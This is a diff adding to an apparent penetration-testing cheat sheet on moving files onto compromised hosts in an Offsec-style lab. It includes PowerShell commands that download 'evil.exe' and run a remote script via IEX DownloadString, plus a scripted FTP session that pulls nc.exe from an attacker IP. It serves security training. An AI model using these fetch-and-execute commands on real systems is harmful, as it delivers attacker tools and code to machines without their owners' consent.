@@ -27,11 +27,61 @@ wget 172.16.0.109/test
 
 Invoke-WebRequest http://10.10.14.45:1234/required_tool -O tool
 
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
 
+You can run a powershell script right away with:
+```
+C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+Hello World
 ```
 
 ### FTP server
 `sudo python3 -m pyftpdlib -p21 -w`
+
+Or you can setup Pure-FTPd
+```
+sudo apt update && sudo apt install pure-ftpd
+
+kali@kali:~$ cat ./setup-ftp.sh
+#!/bin/bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+systemctl restart pure-ftpd
+
+
+kali@kali:~$ chmod +x setup-ftp.sh
+kali@kali:~$ sudo ./setup-ftp.sh
+Password:
+Enter it again:
+Restarting ftp server
+
+```
+
+
+**Retrieve with Linux
+`ftp 10.11.0.4`
+
+**Retrieve with windows
+```
+C:\Users\offsec> ftp -h
+
+C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
+C:\Users\offsec>echo USER offsec>> ftp.txt
+C:\Users\offsec>echo lab>> ftp.txt
+C:\Users\offsec>echo bin >> ftp.txt
+C:\Users\offsec>echo GET nc.exe >> ftp.txt
+C:\Users\offsec>echo bye >> ftp.txt
+
+
+C:\Users\offsec> ftp -v -n -s:ftp.txt
+```
 
 ### SMB server
 ```
